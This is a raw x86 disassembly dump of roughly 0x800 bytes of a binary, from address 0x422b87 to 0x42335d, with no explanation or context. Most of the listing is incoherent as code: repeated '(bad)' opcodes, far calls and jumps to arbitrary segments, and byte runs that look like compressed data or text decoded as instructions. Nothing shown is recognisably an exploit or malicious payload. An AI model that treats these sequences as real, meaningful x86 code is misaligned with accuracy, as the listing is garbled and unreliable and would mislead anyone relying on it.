  422b87:	sbb    eax,ebx
  422b89:	(bad)  [eax]
  422b8b:	jle    0x422baa
  422b8d:	int    0x9c
  422b8f:	mov    al,0xbd
  422b91:	rcl    DWORD PTR [edx],cl
  422b93:	pop    ebp
  422b94:	cs sbb al,0x4
  422b97:	add    al,0xcd
  422b99:	adc    al,ah
  422b9b:	add    al,0x4
  422b9d:	add    al,0x0
	...
  422ba7:	imul   ebp,esi,0xffffffd1
  422baa:	add    al,0x4
  422bac:	add    al,0x4
  422bae:	add    al,0x4
  422bb0:	add    al,0x4
  422bb2:	add    al,0x24
  422bb4:	and    al,0x3d
  422bb6:	adc    BYTE PTR [eax-0x33],bl
  422bb9:	imul   ecx,DWORD PTR ds:0x536d670a,0x72
  422bc0:	push   edi
  422bc1:	and    BYTE PTR [ebp+0x6d],ah
  422bc4:	cmp    al,0x6f
  422bc6:	gs dec ebp
  422bc8:	and    ah,BYTE PTR [edi+0x6d]
  422bcb:	jns    0x422c42
  422bcd:	dec    ebp
  422bce:	cmp    al,0x41
  422bd0:	jae    0x422c37
  422bd2:	gs gs cs jbe 0x422c49
  422bd7:	push   ebx
  422bd8:	and    BYTE PTR [ebx+0x3a],dh
  422bdb:	js     0x422bfd
  422bdd:	push   ebx
  422bde:	and    BYTE PTR [edx+0x68],dh
  422be1:	and    BYTE PTR [esi],ch
  422be3:	cs jae 0x422c55
  422be6:	push   edi
  422be7:	jns    0x422c58
  422be9:	jb     0x422c50
  422beb:	dec    ebp
  422bec:	and    BYTE PTR [edx+0x2f],ah
  422bef:	gs inc edx
  422bf1:	and    BYTE PTR [bp+di+0x28],dh
  422bf5:	arpl   WORD PTR [edx],cx
  422bf7:	and    BYTE PTR cs:[eax],ah
  422bfa:	and    BYTE PTR [ebp+0x53],ah
  422bfd:	outs   dx,BYTE PTR ds:[esi]
  422bfe:	jbe    0x422c61
  422c00:	and    BYTE PTR [ebx+0x22],dh
  422c03:	ds gs ins DWORD PTR es:[edi],dx
  422c06:	jb     0x422c4d
  422c08:	je     0x422c6f
  422c0a:	push   edi
  422c0b:	push   ebx
  422c0c:	jb     0x422c82
  422c0e:	push   0x6665732e
  422c13:	cs arpl WORD PTR cs:[ebx+0x29],si
  422c18:	bound  ebp,QWORD PTR [edi+0x72]
  422c1b:	arpl   WORD PTR gs:[ebx+0x6d],si
  422c1f:	cmp    al,0x3a
  422c21:	outs   dx,BYTE PTR ds:[esi]
  422c22:	je     0x422c8b
  422c24:	ds arpl WORD PTR gs:[esi+0x72],si
  422c29:	inc    esp
  422c2a:	jae    0x422c4e
  422c2c:	and    BYTE PTR ds:0x54746543,cl
  422c32:	test   eax,0x73520a99
  422c37:	sbb    bh,BYTE PTR [edx-0x29]
  422c3a:	je     0x422bde
  422c3c:	and    edx,DWORD PTR [edi-0xa3b6390]
  422c42:	push   DWORD PTR [eax+ebp*4+0x24]
  422c46:	and    al,0x30
  422c48:	push   ebx
  422c49:	and    al,0x24
  422c4b:	aaa    
  422c4c:	inc    ebp
  422c4d:	and    al,0x24
  422c4f:	call   0x6929c1d3
  422c54:	xor    ch,dl
  422c56:	ficomp DWORD PTR [edx]
  422c58:	xor    DWORD PTR [edx],esp
  422c5a:	cmp    DWORD PTR [eax],0x9135339e
  422c60:	adc    DWORD PTR [esi],eax
  422c62:	shl    ebx,cl
  422c64:	stos   BYTE PTR es:[edi],al
  422c65:	dec    ebp
  422c66:	cmp    ah,BYTE PTR [ecx*4+0x3f6c952c]
  422c6d:	lea    ecx,[ebp-0x5b0f1273]
  422c73:	mov    al,0xa8
  422c75:	mov    WORD PTR [ebp-0x437a44b2],ds
  422c7b:	xor    al,0xfa
  422c7d:	imul   eax,DWORD PTR [edi],0x44
  422c80:	sub    bl,dh
  422c82:	push   esp
  422c83:	cli    
  422c84:	js     0x422cb7
  422c86:	mov    al,0x2f
  422c88:	aam    0xe6
  422c8a:	pusha  
  422c8b:	out    dx,al
  422c8c:	jmp    0x200d:0xfd280b69
  422c93:	lea    ecx,[ebp-0x727220aa]
  422c99:	lea    ecx,[ebx-0x74747475]
  422c9f:	mov    ecx,DWORD PTR [ebx+0x64f58b8b]
  422ca5:	xor    DWORD PTR [edi],ecx
  422ca7:	(bad)  
  422ca8:	(bad)  
  422ca9:	(bad)  
  422caa:	(bad)  
  422cab:	(bad)  
  422cac:	(bad)  
  422cad:	pfrcpit2 mm0,QWORD PTR [ebp-0x4ba9887b]
  422cb5:	(bad)  [ebx+eax*2-0x7a]
  422cb9:	inc    esi
  422cba:	pop    eax
  422cbb:	cmp    al,0xf8
  422cbd:	jmp    0x422d05
  422cbf:	in     al,dx
  422cc0:	mov    ebx,0xec904fb3
  422cc5:	je     0x422cec
  422cc7:	inc    ebp
  422cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc9:	test   DWORD PTR [ebp+0x1c4eca93],eax
  422ccf:	imul   ecx,eax,0x40
  422cd2:	stc    
  422cd3:	inc    edx
  422cd4:	sbb    ebp,DWORD PTR [edx-0x21b73f7b]
  422cda:	(bad)  [edx+0x67]
  422cdd:	lds    edx,FWORD PTR [esi]
  422cdf:	es enter 0x2cc2,0x61
  422ce4:	push   ebx
  422ce5:	inc    eax
  422ce6:	popf   
  422ce7:	out    0x85,al
  422ce9:	test   DWORD PTR [ebx+0x62],edx
  422cec:	lods   eax,DWORD PTR ds:[esi]
  422ced:	test   DWORD PTR [ebp-0x7a2ca4aa],eax
  422cf3:	int3   
  422cf4:	jmp    0x422cce
  422cf6:	ins    DWORD PTR es:[edi],dx
  422cf7:	retf   
  422cf8:	int    0x1f
  422cfa:	int    0xfb
  422cfc:	mov    eax,0x6de96134
  422d01:	sub    eax,0xdb7d0e8
  422d06:	mov    esp,0x9f379a5d
  422d0b:	or     esp,0xd1ebcccc
  422d11:	int3   
  422d12:	int3   
  422d13:	pop    esi
  422d14:	in     al,dx
  422d15:	int3   
  422d16:	int3   
  422d17:	int3   
  422d18:	jne    0x422d8f
  422d1a:	jne    0x422d91
  422d1c:	jne    0x422d93
  422d1e:	jne    0x422d95
  422d20:	jne    0x422d63
  422d22:	xor    dl,cl
  422d24:	and    bh,BYTE PTR [edi]
  422d26:	fwait
  422d27:	fs aaa 
  422d29:	icebp  
  422d2a:	jmp    0x52abaaf4
  422d2f:	ja     0x422dae
  422d31:	mov    es,WORD PTR [esi-0x14]
  422d34:	pop    ds
  422d35:	mov    DWORD PTR [edx+ebp*8],0xffffff89
  422d3c:	(bad)  
  422d3d:	(bad)  
  422d3e:	(bad)  
  422d3f:	(bad)  
  422d40:	(bad)  
  422d41:	dec    DWORD PTR [ebx-0x1eac9b75]
  422d47:	mov    cl,BYTE PTR [ebx+0x7fb5518b]
  422d4d:	adc    eax,0xcde71baa
  422d52:	jecxz  0x422dc4
  422d54:	pop    esi
  422d55:	mov    esi,0xbccce00c
  422d5a:	adc    BYTE PTR fs:[edi+0x65891ec6],dl
  422d61:	mov    DWORD PTR [eax],edx
  422d63:	int3   
  422d64:	mov    ebp,0xfd89c219
  422d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d6a:	aaa    
  422d6b:	(bad)  
  422d6e:	mov    esi,DWORD PTR [edi]
  422d70:	arpl   WORD PTR [ebx-0x6aa25c75],cx
  422d76:	mov    eax,DWORD PTR [eax]
  422d78:	daa    
  422d79:	pusha  
  422d7a:	pop    ebp
  422d7b:	fisubr WORD PTR [esi+eax*2+0x4e13bf49]
  422d82:	mov    bh,0x93
  422d84:	rol    BYTE PTR [edi+0x6b],cl
  422d87:	mov    DWORD PTR [edi+0x7ab73e9f],esp
  422d8d:	not    DWORD PTR [eax]
  422d8f:	das    
  422d90:	add    BYTE PTR [eax],al
  422d92:	add    BYTE PTR [eax],ch
  422d94:	or     BYTE PTR [esi+0x1e5477c5],0x23
  422d9b:	adc    BYTE PTR [edi+0x22],al
  422d9e:	test   BYTE PTR [edx],dl
  422da0:	test   BYTE PTR [eax-0x221473c7],bh
  422da6:	mov    al,ds:0x42092829
  422dab:	out    0xd4,al
  422dad:	fst    DWORD PTR [edi+0x20000060]
  422db3:	sbb    DWORD PTR ds:[eax],eax
  422db6:	add    BYTE PTR [eax],al
  422db8:	mov    DWORD PTR [ecx-0x76767677],ecx
  422dbe:	mov    DWORD PTR [ecx-0x7741177],ecx
	...
  422dcc:	add    BYTE PTR [ebp+0x5d30a8d],cl
  422dd2:	stos   DWORD PTR es:[edi],eax
  422dd3:	iret   
  422dd4:	cmp    DWORD PTR [esp+eax*2+0x49d5f7ac],edx
  422ddb:	in     al,0x26
  422ddd:	dec    esi
  422dde:	mov    ds:0x78421ac9,al
  422de3:	push   esp
  422de4:	jle    0x422d97
  422de6:	aas    
  422de7:	lea    ecx,[ebp-0x7272e0c9]
  422ded:	shl    DWORD PTR [eax],cl
  422def:	lea    ecx,[ebp-0x5ccf5323]
  422df5:	adc    DWORD PTR [ebx-0x26],esi
  422df8:	popf   
  422df9:	push   esi
  422dfa:	sbb    ch,dl
  422dfc:	adc    eax,0x2b619a50
  422e01:	xchg   ebp,eax
  422e02:	adc    al,0xda
  422e04:	sahf   
  422e05:	or     eax,0x8de4736e
  422e0a:	and    al,0xac
  422e0c:	enter  0x4a5e,0x24
  422e10:	and    al,0x24
  422e12:	test   eax,0xaf53799f
  422e17:	mov    cl,0x9c
  422e19:	(bad)  
  422e1a:	push   esp
  422e1b:	or     edi,edi
  422e1d:	mov    DWORD PTR [edi-0x28],ebp
  422e20:	lods   eax,DWORD PTR ds:[esi]
  422e21:	fcomp  QWORD PTR [ebx+0x63e8b5cb]
  422e27:	cmp    eax,0xc058cb92
  422e2c:	sbb    eax,0xa55a0777
  422e31:	sbb    BYTE PTR [edx+0x24243956],bh
  422e37:	sbb    BYTE PTR ds:0x33242424,0x33
  422e3e:	xor    esi,DWORD PTR [ebx]
  422e40:	xor    esi,DWORD PTR [ebx]
  422e42:	xor    esi,DWORD PTR [ebx]
  422e44:	xor    ecx,ecx
  422e46:	mov    edx,0x83838303
  422e4b:	add    DWORD PTR [ebx-0x7c7c7c7d],0x74
  422e52:	je     0x422e30
  422e54:	sbb    ebx,DWORD PTR [ebp-0x46b28729]
  422e5a:	aaa    
  422e5b:	sub    al,0x27
  422e5d:	adc    cl,BYTE PTR [eax+esi*1+0x70]
  422e61:	push   esp
  422e62:	into   
  422e63:	ins    BYTE PTR es:[edi],dx
  422e64:	out    dx,eax
  422e65:	mov    BYTE PTR [ecx-0x17570f2e],dh
  422e6b:	je     0x422ee1
  422e6d:	push   0x1a
  422e6f:	and    al,0xe2
  422e71:	push   ds
  422e72:	mov    bl,0x4b
  422e74:	pop    ebx
  422e75:	loopne 0x422e67
  422e77:	mov    esi,0xb2bc56eb
  422e7c:	xchg   esp,eax
  422e7d:	and    eax,0xe582fcb
  422e82:	hlt    
  422e83:	jae    0x422e8c
  422e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e86:	jecxz  0x422ea1
  422e88:	sub    ch,BYTE PTR [edx+0x534e7474]
  422e8e:	into   
  422e8f:	je     0x422f05
  422e91:	test   al,0x5b
  422e93:	sub    dh,BYTE PTR [eax+ebp*8+0x6c]
  422e97:	ja     0x422e7b
  422e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e9a:	fcom   QWORD PTR [ebp-0x25]
  422e9d:	outs   dx,DWORD PTR ds:[esi]
  422e9e:	mov    dl,0x2f
  422ea0:	nop
  422ea1:	ins    DWORD PTR es:[edi],dx
  422ea2:	xor    DWORD PTR [ebp+ebx*2-0x5e9d9a2f],ebx
  422ea9:	in     eax,0xbf
  422eab:	cld    
  422eac:	call   0xe92b1710
  422eb1:	or     BYTE PTR [ecx+0x6d90e8e8],dh
  422eb7:	call   0x4217a4
  422ebc:	(bad)  
  422ebd:	(bad)  
  422ebe:	(bad)  
  422ebf:	(bad)  
  422ec0:	(bad)  
  422ec1:	(bad)  
  422ec2:	jmp    DWORD PTR [eax-0x3052e79d]
  422ec8:	ret    0x8f1a
  422ecb:	or     ecx,0x60
  422ece:	test   al,0xed
  422ed0:	jno    0x422e5f
  422ed2:	lods   al,BYTE PTR ds:[esi]
  422ed3:	dec    edx
  422ed4:	cs pop esi
  422ed6:	lahf   
  422ed7:	add    BYTE PTR [ebp-0x35d4],dh
  422edd:	(bad)  
  422ede:	(bad)  
  422edf:	(bad)  
  422ee0:	(bad)  
  422ee1:	(bad)  
  422ee2:	(bad)  
  422ee3:	push   DWORD PTR [ebp+0x75]
  422ee6:	mov    WORD PTR [ecx+eax*2+0x357575b5],cs
  422eed:	inc    edi
  422eee:	aad    0x4b
  422ef0:	fnstenv [edx-0x26d4b70f]
  422ef6:	sub    BYTE PTR [eax-0x51],cl
  422ef9:	push   edx
  422efa:	faddp  st(7),st
  422efc:	loop   0x422f66
  422efe:	shr    DWORD PTR [ecx],1
  422f00:	or     al,0xb6
  422f02:	jne    0x422e86
  422f04:	addr16 sub ebx,ecx
  422f07:	push   cs
  422f08:	fwait
  422f09:	loopne 0x422e8d
  422f0b:	cmp    bl,bl
  422f0d:	(bad)  
  422f0e:	shl    BYTE PTR [ebp+0x75],cl
  422f11:	add    eax,ecx
  422f13:	jne    0x422f8a
  422f15:	xchg   esp,eax
  422f16:	shl    BYTE PTR [edi],0x75
  422f19:	add    ah,al
  422f1b:	test   DWORD PTR [edx],0x2454c2e6
  422f21:	or     BYTE PTR [ebp+eiz*1+0xe],cl
  422f25:	xchg   ecx,eax
  422f26:	adc    al,BYTE PTR [ebx+edx*8-0x4da6fc49]
  422f2d:	push   0x3
  422f2f:	test   cl,bh
  422f31:	xor    al,0x0
  422f33:	add    BYTE PTR [eax],al
  422f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f36:	push   esi
  422f37:	in     al,0x46
  422f39:	test   BYTE PTR [edi+0x48],ah
  422f3c:	pop    ss
  422f3d:	nop
  422f3e:	jo     0x422f84
  422f40:	cmp    dl,bl
  422f42:	push   eax
  422f43:	leave  
  422f44:	cmc    
  422f45:	add    ebp,ebp
  422f47:	stos   BYTE PTR es:[edi],al
  422f48:	aad    0x99
  422f4a:	sub    DWORD PTR ds:0x25762db8,0xffffffcf
  422f51:	mov    esi,0x84820000
  422f56:	imul   eax,DWORD PTR [eax],0x45450000
  422f5c:	inc    ebp
  422f5d:	inc    ebp
  422f5e:	inc    ebp
  422f5f:	inc    ebp
  422f60:	inc    ebp
  422f61:	inc    ebp
  422f62:	inc    ebp
  422f63:	call   0xffff:0xffffa32f
  422f6a:	(bad)  
  422f6b:	(bad)  
  422f6c:	(bad)  
  422f6d:	(bad)  
  422f6e:	inc    DWORD PTR [eax]
  422f70:	add    BYTE PTR [ecx+esi*8],ah
  422f73:	gs xchg ebx,eax
  422f75:	ret    0x250c
  422f78:	mov    ebx,DWORD PTR [esi-0x79]
  422f7b:	jne    0x422f5b
  422f7d:	test   al,0x94
  422f7f:	mul    BYTE PTR [ecx+0xfe6d7cb]
  422f85:	inc    edi
  422f86:	push   esp
  422f87:	and    DWORD PTR [eax+0x51d10000],0x60710000
  422f91:	add    BYTE PTR [eax],al
  422f93:	jne    0x422fbc
  422f95:	shl    DWORD PTR [ecx],1
  422f97:	inc    eax
  422f98:	daa    
  422f99:	mov    esp,0x5ce8194b
  422f9e:	jg     0x422f61
  422fa0:	std    
  422fa1:	adc    dh,ch
  422fa3:	cwde   
  422fa4:	popa   
  422fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa6:	(bad)  
  422fa8:	ret    
  422fa9:	(bad)  
  422faa:	jb     0x423011
  422fac:	bound  esp,QWORD PTR [ebx+0x76]
  422faf:	ins    DWORD PTR es:[edi],dx
  422fb0:	bound  ecx,QWORD PTR [ebp+0x6b]
  422fb3:	and    BYTE PTR [ecx+0x65],ch
  422fb6:	gs and dh,BYTE PTR gs:[edx+0x68]
  422fbb:	bound  esi,QWORD PTR [ecx+ebp*2+0x65]
  422fbf:	inc    ecx
  422fc0:	bound  esp,QWORD PTR [eax]
  422fc2:	imul   ebp,DWORD PTR gs:[edi+0x65],0x64737363
  422fca:	and    BYTE PTR [esi],ch
  422fcc:	jns    0x42303b
  422fce:	ins    DWORD PTR es:[edi],dx
  422fcf:	arpl   WORD PTR [ebp+0x73],sp
  422fd2:	je     0x423041
  422fd4:	arpl   WORD PTR [esi+0x67],sp
  422fd7:	ins    DWORD PTR es:[edi],dx
  422fd8:	arpl   WORD PTR [ebx+0xd],si
  422fdb:	jb     0x42301a
  422fdd:	popa   
  422fde:	imul   esp,DWORD PTR [ebp+0x20],0x53782073
  422fe5:	jb     0x422ff6
  422fe7:	add    BYTE PTR [ebx],dh
  422fe9:	pop    ebx
  422fea:	pushf  
  422feb:	push   esi
  422fec:	(bad)  
  422fed:	xor    esi,DWORD PTR [ebx]
  422fef:	xor    ebx,esi
  422ff1:	jo     0x422fb3
  422ff3:	sub    bl,dl
  422ff5:	inc    edx
  422ff6:	pop    eax
  422ff7:	sahf   
  422ff8:	(bad)
  422ffb:	add    bl,BYTE PTR [ecx]
  422ffd:	mov    bl,0x22
  422fff:	leave  
  423000:	imul   edx,ecx,0xffffffba
  423003:	jmp    0xb4b825d9
  423008:	jo     0x423065
  42300a:	jnp    0x423077
  42300c:	mov    ch,0xa3
  42300e:	or     eax,0xf84ba99d
  423013:	xor    esi,DWORD PTR [ebx]
  423015:	add    al,0x41
  423017:	xor    esi,DWORD PTR [ebx]
  423019:	xor    esi,DWORD PTR [esp+esi*2+0x74]
  42301d:	je     0x423093
  42301f:	je     0x423095
  423021:	je     0x423097
  423023:	jb     0x422fbb
  423025:	mov    edx,0x8b8b8b8b
  42302a:	mov    ecx,DWORD PTR [ebx+0x48b8b8b]
  423030:	add    al,0x91
  423032:	or     ebp,DWORD PTR [edx-0x6bcdf29b]
  423038:	dec    esp
  423039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42303a:	fbstp  TBYTE PTR [edx-0x68fab424]
  423040:	daa    
  423041:	jg     0x4230af
  423043:	cmp    DWORD PTR [ebx+0x30659916],ecx
  423049:	add    al,0x4
  42304b:	stos   BYTE PTR es:[edi],al
  42304c:	call   0xede6:0x4b24cfe4
  423053:	dec    eax
  423054:	ins    DWORD PTR es:[edi],dx
  423055:	fnstsw WORD PTR [edi+0x7a]
  423058:	aad    0x18
  42305a:	mov    edx,0x85929e5a
  42305f:	fs xchg esi,eax
  423061:	jge    0x423050
  423063:	inc    edx
  423064:	jle    0x4230c5
  423066:	popa   
  423067:	dec    ebp
  423068:	add    al,0x4
  42306a:	data16 add al,0xf9
  42306d:	add    al,0x4
  42306f:	pushf  
  423070:	bound  esi,QWORD PTR [edi+0x4]
  423073:	mov    esp,edi
  423075:	xchg   edi,eax
  423076:	cld    
  423077:	jl     0x4230d7
  423079:	fwait
  42307a:	cmp    edi,DWORD PTR ds:0x98ad2d07
  423080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423081:	popa   
  423082:	dec    ebx
  423083:	ja     0x423094
  423085:	inc    ebx
  423086:	out    dx,eax
  423087:	sbb    eax,0x338cd8ba
  42308c:	mov    ecx,DWORD PTR [ebx-0x74a6cc75]
  423092:	mov    esi,ebx
  423094:	dec    eax
  423095:	mov    ecx,DWORD PTR [ebx+0x8b]
  42309b:	add    BYTE PTR [eax],al
  42309d:	add    BYTE PTR [eax],al
  42309f:	add    BYTE PTR [eax],al
  4230a1:	or     DWORD PTR [ebx+0x20],ecx
  4230a4:	loope  0x423098
  4230a6:	jg     0x4230b6
  4230a8:	into   
  4230a9:	imul   edi,DWORD PTR [ebx-0x57],0x17e893ad
  4230b0:	pop    ebx
  4230b1:	inc    edi
  4230b2:	repnz cmp al,0x26
  4230b5:	add    eax,0x8b21259b
  4230ba:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4230c0:	mov    ecx,DWORD PTR [ebx-0x20090000]
  4230c6:	dec    ebx
  4230c7:	lea    eax,[eax]
  4230c9:	add    BYTE PTR [ecx],dl
  4230cb:	(bad)  
  4230cc:	call   0x9b86:0x86b38485
  4230d3:	(bad)  
  4230d4:	cmp    edx,edi
  4230d6:	lods   eax,DWORD PTR ds:[esi]
  4230d7:	cmp    ah,BYTE PTR [ecx+0x44c9b211]
  4230dd:	mov    al,ds:0x2289feb4
  4230e2:	or     ebx,DWORD PTR [eax+0x72]
  4230e5:	jne    0x423141
  4230e7:	inc    ebp
  4230e8:	ds inc esi
  4230ea:	and    DWORD PTR [ebx],esi
  4230ec:	fild   WORD PTR [eax]
  4230ee:	add    BYTE PTR [edx+edx*2],al
  4230f1:	add    BYTE PTR [eax],al
  4230f3:	or     al,bh
  4230f5:	add    BYTE PTR cs:[eax],al
  4230f8:	push   cs
  4230f9:	push   0xc48f2368
  4230fe:	mov    ebx,0x93c0433d
  423103:	stc    
  423104:	in     al,0x3d
  423106:	jae    0x423183
  423108:	inc    edx
  423109:	ficom  DWORD PTR [edi]
  42310b:	cmp    ch,0xd4
  42310e:	inc    edi
  42310f:	pop    ebx
  423110:	add    BYTE PTR [eax],al
  423112:	add    BYTE PTR [edi*2+0xd36c35a],bh
  423119:	and    esi,DWORD PTR [esi+edi*8+0x3f]
  42311d:	je     0x423142
  42311f:	mov    al,0x17
  423121:	fdivp  st(7),st
  423123:	xor    ebx,esp
  423125:	mov    ds:0x47b97e72,al
  42312a:	xchg   edi,eax
  42312b:	retf   0x551b
  42312e:	xchg   ecx,eax
  42312f:	pop    ds
  423130:	add    BYTE PTR [eax],al
  423132:	xchg   ecx,eax
  423133:	push   esi
  423134:	add    DWORD PTR [eax],eax
  423136:	add    BYTE PTR [eax],al
  423138:	lea    ecx,[ebp-0x72727273]
  42313e:	lea    ecx,[ebp+0x71e23e8d]
  423144:	(bad)  
  423145:	(bad)  
  423146:	(bad)  
  423147:	(bad)  
  423148:	(bad)  
  423149:	(bad)  
  42314a:	(bad)  
  42314b:	(bad)  
  42314c:	(bad)  
  42314d:	(bad)  
  42314e:	jmp    eax
  423150:	dec    ebp
  423151:	add    ecx,DWORD PTR [edi]
  423153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423154:	cmp    ebp,esi
  423156:	sub    dl,ah
  423158:	push   edi
  423159:	sub    cl,ah
  42315b:	sbb    bh,BYTE PTR [ecx+0x52ea9019]
  423161:	xchg   ebp,eax
  423162:	nop
  423163:	sub    ebx,DWORD PTR [esp+eiz*4-0x20000e9]
  42316a:	outs   dx,DWORD PTR ds:[esi]
  42316b:	(bad)  
  42316c:	call   eax
  42316e:	add    bh,bh
  423170:	call   DWORD PTR [ebp+0x5239e077]
  423176:	cwde   
  423177:	jmp    0x4231b9
  423179:	test   al,0xc8
  42317b:	dec    ebp
  42317c:	xchg   ebp,eax
  42317d:	scas   al,BYTE PTR es:[edi]
  42317e:	ficom  DWORD PTR [eax-0x13]
  423181:	cdq    
  423182:	or     cl,BYTE PTR [ebx-0x43]
  423185:	lea    dx,es:[edi+edi*8]
  42318a:	inc    ebp
  42318b:	mov    edi,0x45cb07d8
  423190:	inc    ebp
  423191:	inc    ebp
  423192:	push   cs
  423193:	in     eax,0x3c
  423195:	sbb    DWORD PTR [edx+0x65],esi
  423198:	gs jb  0x423201
  42319b:	cs cs inc esp
  42319e:	and    BYTE PTR ds:[edx+0x2e],ah
  4231a2:	and    BYTE PTR [esi+0x69],dh
  4231a5:	arpl   WORD PTR [edi+0x2e],bp
  4231a8:	bound  edi,QWORD PTR gs:[eax+0x20]
  4231ac:	outs   dx,DWORD PTR gs:[esi]
  4231ae:	bound  esi,QWORD PTR [ebx+0x65]
  4231b1:	and    sp,WORD PTR [eax]
  4231b4:	ds jbe 0x423229
  4231b7:	gs jae 0x42322c
  4231ba:	bound  ebp,QWORD PTR [ebp+0x3e]
  4231bd:	imul   ebp,DWORD PTR [ebp+0x20],0x6d226f20
  4231c4:	gs dec bp
  4231c7:	or     eax,0x20752220
  4231cc:	je     0x423244
  4231ce:	jae    0x423235
  4231d0:	inc    esp
  4231d1:	ins    DWORD PTR es:[edi],dx
  4231d2:	outs   dx,BYTE PTR ds:[si]
  4231d4:	and    BYTE PTR [ecx+0x65],bh
  4231d7:	gs ins DWORD PTR es:[edi],dx
  4231d9:	jbe    0x423240
  4231db:	bound  esp,QWORD PTR cs:[ebp+0x6d]
  4231df:	cs gs inc ebx
  4231e2:	das    
  4231e3:	addr16 cmp al,0x2e
  4231e6:	jne    0x423258
  4231e8:	and    BYTE PTR gs:[esi+esi*4-0x40],dl
  4231ed:	js     0x4231e3
  4231ef:	cmp    al,0x18
  4231f1:	and    al,0xd7
  4231f4:	or     al,0xb2
  4231f6:	(bad)  
  4231f7:	xchg   esp,eax
  4231f8:	inc    ebp
  4231f9:	jno    0x4231a6
  4231fb:	dec    ebx
  4231fc:	ror    esp,0x66
  4231ff:	mov    al,0xac
  423201:	cld    
  423202:	pop    eax
  423203:	int    0x8c
  423205:	push   edi
  423206:	xchg   esp,eax
  423207:	push   0xdd4545bd
  42320c:	cmovne eax,DWORD PTR [ebp+0x45]
  423210:	or     BYTE PTR [eax],cl
  423212:	or     BYTE PTR [eax],cl
  423214:	or     BYTE PTR [eax],cl
  423216:	or     BYTE PTR [eax],cl
  423218:	or     BYTE PTR ds:0x893a,dh
  42321e:	add    BYTE PTR [eax],al
  423220:	add    BYTE PTR [eax],al
  423222:	add    BYTE PTR [eax],al
  423224:	add    BYTE PTR [ebx+0x7265a283],al
  42322a:	neg    DWORD PTR [edi+ebp*8+0x37a7c153]
  423231:	loopne 0x4231d1
  423233:	add    DWORD PTR [eax+eiz*1-0x4df762b1],esi
  42323a:	aas    
  42323b:	xchg   esp,eax
  42323c:	xchg   edi,eax
  42323d:	inc    edi
  42323e:	add    DWORD PTR ss:[ebx-0x56d9b06c],0xffffffcf
  423246:	push   edx
  423247:	fidiv  DWORD PTR [ecx]
  423249:	test   eax,0x1b23220c
  42324e:	ins    BYTE PTR es:[edi],dx
  42324f:	xchg   BYTE PTR [edx-0x691fcfc3],bl
  423255:	cmp    al,0xd5
  423257:	(bad)  
  423258:	aaa    
  423259:	mov    DWORD PTR [ecx+0x5b],ebx
  42325c:	imul   ebp,edx,0xffffff83
  42325f:	or     esi,0xffffffff
  423262:	and    al,0x83
  423264:	xor    eax,0xffffffa6
  423267:	add    DWORD PTR [ebx+0x3c0b088b],eax
  42326d:	out    0x53,al
  42326f:	push   es
  423270:	pop    ebx
  423271:	pop    edi
  423272:	fsubr  DWORD PTR [eax]
  423274:	push   0xfae91b7
  423279:	jb     0x423221
  42327b:	and    eax,0x747f1497
  423280:	sbb    DWORD PTR [esi+0x538b8b8b],0xb28b8b57
  42328a:	test   BYTE PTR [ebx+0x8b8b],cl
  423290:	add    BYTE PTR [eax],al
  423292:	add    BYTE PTR [eax],al
  423294:	add    BYTE PTR [eax],al
  423296:	add    BYTE PTR [edx+0x11550e95],dl
  42329c:	add    eax,0xb8ddf191
  4232a1:	jno    0x4232b3
  4232a3:	sahf   
  4232a4:	xor    ch,cl
  4232a6:	xlat   BYTE PTR ds:[ebx]
  4232a7:	dec    ebp
  4232a8:	cs out 0x2,eax
  4232ab:	xchg   ebp,eax
  4232ac:	movmskps ebx,xmm3
	...
  4232b7:	add    BYTE PTR [eax],al
  4232b9:	add    BYTE PTR [ebp-0x16],bl
  4232bc:	sti    
  4232bd:	jne    0x4232bf
  4232bf:	add    BYTE PTR [ebx],bh
  4232c1:	xor    DWORD PTR [esi+edi*4],ecx
  4232c4:	sti    
  4232c5:	sub    dl,bl
  4232c7:	add    al,0xe9
  4232c9:	fld    TBYTE PTR [esi]
  4232cb:	not    eax
  4232cd:	bound  esi,QWORD PTR [edi-0x25]
  4232d0:	call   0x9fed:0x57dcbe1e
  4232d7:	out    dx,eax
  4232d8:	das    
  4232d9:	inc    ebp
  4232da:	jmp    0xe641:0x93acd3d8
  4232e1:	repnz add BYTE PTR [bx+si],al
  4232e5:	in     eax,dx
  4232e6:	fiadd  WORD PTR [eax]
  4232e8:	add    BYTE PTR [ecx],dh
  4232ea:	and    eax,0xb145008c
  4232ef:	adc    BYTE PTR [edi],bl
  4232f1:	dec    edi
  4232f2:	push   ds
  4232f3:	sub    DWORD PTR [ebp-0x35],edx
  4232f6:	sub    al,0x62
  4232f8:	or     al,0xf6
  4232fa:	in     eax,0xe8
  4232fc:	jecxz  0x423346
  4232fe:	push   edx
  4232ff:	ret    0x21c
  423302:	loopne 0x423294
  423304:	lods   eax,DWORD PTR ds:[esi]
  423305:	cs inc ebp
  423307:	inc    ebp
  423308:	inc    ebp
  423309:	mov    al,ds:0xc7ec4540
  42330e:	xor    al,0x88
  423310:	push   eax
  423311:	adc    dh,BYTE PTR [esp+esi*1-0x6b]
  423315:	and    ebx,DWORD PTR ds:0xff217308
  42331b:	xor    dl,BYTE PTR [ecx+0x2f]
  42331e:	addr16 push esi
  423320:	sbb    DWORD PTR [edx],0x7250bf62
  423326:	inc    ebp
  423327:	inc    ebp
  423328:	lods   eax,DWORD PTR ds:[esi]
  423329:	je     0x42332e
  42332b:	inc    ebp
  42332c:	inc    ebp
  42332d:	inc    ebp
  42332e:	jne    0x4233a5
  423330:	jne    0x4233a7
  423332:	jne    0x4233a9
  423334:	jne    0x4233ab
  423336:	jne    0x4232e0
  423338:	cmc    
  423339:	mov    eax,DWORD PTR [eax]
	...
  423343:	add    BYTE PTR [eax],al
  423345:	adc    al,0x8
  423347:	jns    0x42332b
  423349:	call   0xb49d:0xf8da3258
  423350:	leave  
  423351:	(bad)  
  423353:	jne    0x423343
  423355:	ret    
  423356:	mov    al,ds:0x56efac86
  42335b:	cli    
  42335c:	pop    esp
  42335d:	add    BYTE PTR [eax],al
